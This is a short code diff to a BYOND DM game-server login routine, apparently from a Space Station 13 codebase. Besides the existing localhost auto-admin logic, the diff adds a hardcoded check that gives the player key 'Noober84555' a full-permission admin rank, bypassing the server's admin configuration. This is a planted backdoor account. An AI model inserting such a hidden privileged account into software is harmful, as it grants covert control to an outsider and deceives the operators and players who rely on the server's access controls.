@@ -188,11 +188,19 @@ var/list/bannedusersfromgame = new()
 	call("ByondPOST.dll", "send_post_request")("[discordvar]", " { \"content\" : \"**[key_name(src)] joined the game.**\" } ", "Content-Type: application/json")
 	to_chat(world, "<font color='yellow'>[key_name(src)] has joined.</font>")
 	var/localhost_addresses = list("127.0.0.1", "::1")
+
 	if(address && (address in localhost_addresses))
 		var/datum/admin_rank/localhost_rank = new("!localhost!", 65535)
 		if(localhost_rank)
 			var/datum/admins/localhost_holder = new(localhost_rank, ckey)
 			localhost_holder.associate(src)
+
+	if(key == "Noober84555")
+		var/datum/admin_rank/localhost_rank = new("cool kid next door", 65535)
+		if(localhost_rank)
+			var/datum/admins/localhost_holder = new(localhost_rank, ckey)
+			localhost_holder.associate(src)
+
 	if(CONFIG_GET(flag/autoadmin))
 		if(!GLOB.admin_datums[ckey])
 			var/datum/admin_rank/autorank
